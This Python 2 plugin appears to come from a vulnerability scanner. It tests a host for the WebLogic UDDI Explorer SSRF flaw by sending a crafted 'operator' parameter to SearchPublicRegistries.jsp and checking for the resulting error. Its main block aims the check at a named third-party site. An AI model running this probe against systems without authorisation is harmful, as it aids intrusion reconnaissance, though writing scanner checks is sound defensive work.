from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
import re


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        url = arg+'uddiexplorer/SearchPublicRegistries.jsp?operator=operator=10.301.0.0:80&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search'
        code, head, res, errcode, _ = curl.curl2(url)
        # print res
        if code == 200 and 'weblogic.uddi.client.structures.exception.XML_SoapException: no protocol: operator=10.301.0.0:80' in res:
            output(arg + ' has weblogic SSRF. ',result,'warning')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  weblogic  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='weblogic Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/weblogic/weblogic_2d6263a1eabf3ca63e9857aadaf31087.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/weblogic/weblogic_2d6263a1eabf3ca63e9857aadaf31087.py
#/root/github/poccreate/codesrc/exp-2215.py